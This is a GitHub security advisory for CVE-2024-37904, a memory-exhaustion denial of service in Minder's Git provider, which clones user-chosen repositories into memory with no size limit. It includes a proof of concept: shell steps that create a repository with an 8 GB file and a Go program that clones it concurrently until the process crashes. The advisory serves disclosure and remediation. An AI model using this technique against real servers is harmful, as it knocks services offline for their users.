# [M] Minder affected by denial of service from maliciously configured Git repository

## Summary
Severity: Medium
Advisory: GHSA-hpcg-xjq5-g666
CVE: CVE-2024-37904
CWE: CWE-400
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-06-18
Source: https://github.com/advisories/GHSA-hpcg-xjq5-g666
Type: github-advisory

## Affected
- Go: `github.com/stacklok/minder` — affected >=0 <0.0.52

## Details
Minder's Git provider is vulnerable to a denial of service from a maliciously configured GitHub repository. The Git provider clones users repositories using the `github.com/go-git/go-git/v5` library on these lines:

https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89

The Git provider does the following on these lines:

First, it sets the `CloneOptions`, specifying the url, the depth etc:

https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62

It then validates the options: 

https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L66-L68

It then sets up an in-memory filesystem, to which it clones:

https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L70-L71

Finally, it clones the repository:

https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L77

This `(g *Git) Clone()` method is vulnerable to a DoS attack: A Minder user can instruct Minder to clone a large repository which will exhaust memory and crash the Minder server. The root cause of this vulnerability is a combination of the following conditions:

1. Users can control the Git URL which Minder clones.
2. Minder does not enforce a size limit to the repository.
3. Minder clones the entire repository into memory.

## PoC
Here, we share a PoC of how the logic of `(g *Git) Clone()` behaves isolated from Minder. To get a true assessment of whether this is 100% identical to its behavior in the context of Minder instead of an isolated PoC, this should be tested out by creating a large repository and instructing Minder to clone it. However, even in that case, it might not be possible to deterministically trigger a DoS because of noise from network calls.

We believe the below PoC is a correct representation because:

1. We have replicated the important and impactful parts of `(g *Git) Clone()`
2. We run this in multiple goroutines which Minder does here: https://github.com/stacklok/minder/blob/3afa50ef2e06269ed619d390d266cf1988c2068b/internal/engine/executor.go#L128
3. Minders timeout is set to 5 minutes: https://github.com/stacklok/minder/blob/3afa50ef2e06269ed619d390d266cf1988c2068b/internal/engine/executor.go#L114. With a reasonable connection, Minder can download many GBs in that period.

In our PoC, we demonstrate that under these two conditions, a large repository can perform a SigKill of the Go process which in Minders case is the Minder server.

First, create a local Git repository:
```
cd /tmp
mkdir upstream-repo
cd upstream-repo
git init --bare
cd /tmp
git clone /tmp/upstream-repo ./upstream-repo-clone
cd ./upstream-repo-clone
# Add large file:
fallocate -l 8G large-file
git add .
git commit -m "add large file"
git push
cd /tmp
```

Create and run the following script in `/tmp/dos-poc/main.go`:

```go
package main

import (
        "context"
        "fmt"
        "github.com/go-git/go-billy/v5/memfs"
        "github.com/go-git/go-git/v5"
        "github.com/go-git/go-git/v5/storage/memory"
        "runtime"
        "sync"
)

func main() {
        var (
                wg  sync.WaitGroup
        )

        for i := 0; i < 2; i++ {
                fmt.Println("Starting one...")
                wg.Add(1)
                go func() {
                        defer wg.Done()
                        opts := &git.CloneOptions{
                                URL:          "/tmp/upstream-repo",
                                SingleBranch: true,
                                Depth:        1,
                                Tags:         git.NoTags,
                        }

                        storer := memory.NewStorage()
                        fs := memfs.New()
                        git.CloneContext(context.Background(), storer, fs, opts)
                }()
        }
        fmt.Println("Finished")
        PrintMemUsage()
        wg.Wait()

}

func PrintMemUsage() {
        var m runtime.MemStats
        runtime.ReadMemStats(&m)
        // For info on each, see: https://golang.org/pkg/runtime/#MemStats
        fmt.Printf("Alloc = %v MiB", bToMb(m.Alloc))
        fmt.Printf("\tTotalAlloc = %v MiB", bToMb(m.TotalAlloc))
        fmt.Printf("\tSys = %v MiB", bToMb(m.Sys))
        fmt.Printf("\tNumGC = %v\n", m.NumGC)
}

func bToMb(b uint64) uint64 {
        return b / 1024 / 1024
}
```

On my local machine, this Go program is killed before it prints "Finished" in the terminal. Observing the memory by way of `top`, we can see that the memory climbs steadily until the program crashes around 93% memory consumption.

## References
- https://github.com/stacklok/minder/security/advisories/GHSA-hpcg-xjq5-g666
- https://nvd.nist.gov/vuln/detail/CVE-2024-37904
- https://github.com/stacklok/minder/commit/35bab8f9a6025eea9e6e3cef6bd80707ac03d2a9
- https://github.com/stacklok/minder/commit/7979b43
- https://github.com/stacklok/minder
- https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L55-L89
- https://github.com/stacklok/minder/blob/85985445c8ac3e51f03372e99c7b2f08a6d274aa/internal/providers/git/git.go#L56-L62
